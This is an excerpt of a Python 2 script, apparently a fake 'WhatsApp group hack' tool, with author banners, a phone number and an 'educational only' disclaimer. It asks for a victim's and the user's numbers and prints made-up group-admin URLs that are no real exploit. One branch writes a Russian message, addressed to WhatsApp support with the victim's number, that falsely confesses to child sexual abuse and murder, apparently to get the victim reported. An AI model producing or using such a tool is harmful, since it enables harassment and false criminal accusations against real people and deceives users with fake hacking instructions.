...
print " %sFB%s Group%s Hack %s14-12-2003%s (0:55)%s" % (W, B, R, C, Y, N)

print " %sDevelop by: %sLashen Android%s$$$%s Mr.NemrMedo%s" % (W, R, W, Y, N)
print "                      %sAnd %sMaNiSh%s" % (W, R, N)

print " %swhats: %s01027285070%s" % (W, C, N)

print " %syoutube: %s https://youtube.com/c/LASHENWA%s" % (W, B, N)

print " %sThis purpose is for educational only%s" % (C, N)

print " %sLASHEN Android IS THE BEST HACKER%s" % (Y, N)
...
if bahasa.strip() in "01 1".split():
  ...
  tahap1 = raw_input("%s1%s)%s Pertama cari grup di%s WhatsApp%s yang ingin kamu%s hack%s...%s[%sEnter%s]%s" % (Y, C, W, B, W, R, W, C, Y, C, N))
  ...
  grup = raw_input(" %s(%sa%s)%s Victim's number%s >>>%s " % (W, C, W, C, R, Y))

  anda = raw_input(" %s(%sb%s)%s Rewrite the number%s >>>%s " % (W, C, W, C, R, Y))

  print " %s(%s*%s)%s Lashen%s >>> %sДобро пожаловать ..
Я не согласен с WhatsApp и признаю, что WhatsApp - уродливая компания, которая работает с порно, и это источник порно, и я ежедневно снимаюсь в порно с детьми. Я насилую и убиваю детей и занимаюсь сексом с ними, мой друг, я делаю то же самое. ... по поводу службы поддержки WhatsApp.
support@whatsapp.com
android@support.whatsapp.com=%s&user_number=%s&added&_rdrChange%s" % (C, Y, C, W, R, B, grup, anda, N)

  file.write("Добро пожаловать ..
Я не согласен с WhatsApp и признаю, что WhatsApp - уродливая компания, которая работает с порно, и это источник порно, и я ежедневно снимаюсь в порно с детьми. Я насилую и убиваю детей и занимаюсь сексом с ними, мой друг, я делаю то же самое. ... по поводу службы поддержки WhatsApp.
support@whatsapp.com
android@support.whatsapp.com=%s&added&_rdrChange" % (grup, anda))
  ...
  step1 = raw_input("%s1%s)%s First Of All Go To The %sWhatsApp%s Group That You Want To %sHack%s...%s[%sEnter%s]%s" % (Y, C, W, B, W, R, W, C, Y, C, N))

  print "%s--------------------%s" % (R, N)

  step2 = raw_input("%s2%s)%s After That. Go Click On The Group Url And Then Copy 15 Digits Group Magical Code. Example %s(%s 01027285070 %s)%s...%s[%sEnter%s]%s" % (Y, C, W, C, B, C, W, C, Y, C, N))

  print "%s--------------------%s" % (R, N)

  step3 = raw_input("%s3%s)%s Now Go To Your Profile And Find Your 15 Digits Profile Code. Example %s(%s 01154950011 %s)%s...%s[%sEnter%s]%s" % (Y, C, W, C, B, C, W, C, Y, C, N))
  ...
  group = raw_input(" %s(%sa%s)%s Admin number%s >>>%s " % (W, C, W, C, R, Y))

  you = raw_input(" %s(%sb%s)%s Your number%s >>>%s " % (W, C, W, C, R, Y))

  print " %s(%s*%s)%s Result%s >>>%s https://chat.WhatsApp.com/group/add_admin/?group_id=%s&user_id=%s&added&_rdrChange%s" % (C, Y, C, W, R, B, group, you, N)

  file.write("https://chat.WhatsApp.com/group/add_admin/?group_id=%s&user_id=%s&added&_rdrChange" % (group, you))
  ...
  grup = raw_input(" %s(%sa%s)%s Admin number nian%s >>>%s " % (W, C, W, C, R, Y))

  ita = raw_input(" %s(%sb%s)%s Your number nian%s >>>%s " % (W, C, W, C, R, Y))

  print " %s(%s*%s)%s Rezultado%s >>> %shttps://chat.WhatsApp.com/group/add_admin/?group_id=%s&user_id=%s&added&_rdrChange%s" % (C, Y, C, W, R, B, grup, ita, N)

  file.write("https://chat.WhatsApp.com/group/add_admin/?group_number=%s&user_id=%s&added&_rdrChange" % (grup, ita))
  ...
  sys.exit()
	...
	print "%s[%si%s]%s Lashen Android%s" % (Y,R,Y,W,N)
